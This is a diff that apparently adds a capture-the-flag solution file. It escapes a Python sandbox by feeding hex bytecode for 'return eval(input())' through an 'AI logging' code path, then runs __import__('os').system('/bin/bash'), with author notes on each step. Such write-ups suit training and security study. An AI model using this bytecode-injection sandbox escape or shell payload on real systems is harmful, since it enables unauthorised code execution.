@@ -1,0 +1,40 @@
+eval,input,"omelet","a","b"
+6401740074018300830166025300
+__import__("os").system("/bin/bash")
+
+NOTE: The hex string is dependent on the Python version (see Notes below).
+
+Solution notes:
+The instruction filtering part is pretty distracting and one really wants to
+focus on bypassing that. It took me a few minutes before I unglued myself from
+that and went back to looking at the weird "AI" logging code.
+
+Once I finally spotted the ai_log_code part, the solution became pretty obvious
+(at least for someone who knows Python internals), and I split it into 3 steps:
+
+1. Create a function which just does `return eval(input())` opcodes as hex:
+
+  >>> def a():
+  ...   return eval(input())
+  >>> a.__code__.co_code.hex()
+  '6401740074018300830166025300'
+
+2. Create a string which has the proper globals (eval, input) in place, a string
+with "unsandboxed" Python code to execute, and the magical "omelet" phrase.
+
+  eval,input,"omelet","a","b"
+
+3. Create Python code which will run bash.
+
+  __import__("os").system("/bin/bash")
+
+Passing these three items in the order 2 1 3 gives one bash.
+
+Note that Python opcodes can and do change between Python versions, Step 1 (and
+perhaps Step 2) need to be done by the player on the same Python version as is
+running on the container. That said, a player can easily determine the version:
+
+  ~===========<8>~ Enter Python code:
+  sys.version
+  Evaluating...
+  The answer is: 3.10.6 (main, May 29 2023, 11:10:38) [GCC 11.3.0]
